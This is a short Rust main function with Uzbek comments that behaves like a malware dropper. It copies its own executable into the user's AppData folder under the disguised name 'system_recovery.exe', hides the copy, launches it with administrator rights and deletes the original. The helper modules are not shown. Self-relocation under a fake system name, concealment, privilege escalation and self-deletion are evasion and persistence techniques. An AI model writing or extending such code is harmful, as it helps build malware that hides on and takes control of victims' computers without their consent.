use crate::file_manager;
use crate::utils;
use std::env;
use crate::utils::run_as_admin;

pub fn main() {
    // Foydalanuvchi papkasini olish
    let user_folder = match env::var("USERPROFILE") {
        Ok(path) => path,
        Err(e) => {
            eprintln!("USERPROFILE topilmadi: {}", e);
            return;
        }
    };

    let new_location = format!(
        "{}\\AppData\\Roaming\\MsDOS\\system_recovery.exe",
        user_folder
    );

    println!("Hello from app");
    file_manager::clone_self(&new_location);
    utils::hide_app(&new_location);
    run_as_admin(&new_location);
    file_manager::self_delete();
}
